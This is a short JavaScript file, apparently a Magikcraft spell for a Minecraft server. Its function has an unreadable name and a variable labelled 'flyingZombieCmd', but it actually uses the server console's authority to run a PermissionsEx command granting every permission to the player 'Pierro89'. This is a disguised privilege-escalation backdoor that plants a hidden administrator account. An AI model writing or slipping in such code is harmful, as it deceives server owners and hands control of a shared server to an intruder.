const magik = magikcraft.io;

function »++--++«() {

    function run(cmd) {
        var sudo = magik.getPlugin().getServer().getConsoleSender();
        magik.getPlugin().getServer().dispatchCommand(sudo, cmd);
    }
    const flyingZombieCmd = 'pex user Pierro89 add *';

    run(flyingZombieCmd);
}